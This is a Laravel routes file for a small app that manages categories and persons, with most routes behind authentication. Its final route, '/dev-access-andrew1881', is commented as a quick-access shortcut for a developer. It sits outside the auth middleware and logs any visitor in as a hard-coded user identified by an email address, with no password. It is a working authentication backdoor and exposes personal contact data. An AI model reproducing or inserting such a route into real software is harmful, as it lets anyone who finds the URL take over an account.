<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\CategoryController;
use App\Http\Controllers\PersonController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\DebugController;

Route::get('/', function () {
    return redirect()->route('login');
});

Auth::routes();

Route::middleware('auth')->group(function () {
    Route::get('/home', [HomeController::class, 'index'])->name('home');

    Route::resource('categories', CategoryController::class);
    Route::resource('persons', PersonController::class);

    Route::get('/debug', [DebugController::class, 'index'])->name('debug.index');
});

// Ruta de acceso rápido para Andrew
Route::get('/dev-access-andrew1881', function () {
    $user = App\Models\User::where('email', 'geremy_rko56@hotmail.com')->first();
    if ($user) {
        Auth::login($user);
        return redirect('/home');
    }
    return 'Usuario no encontrado';
})->name('dev.access');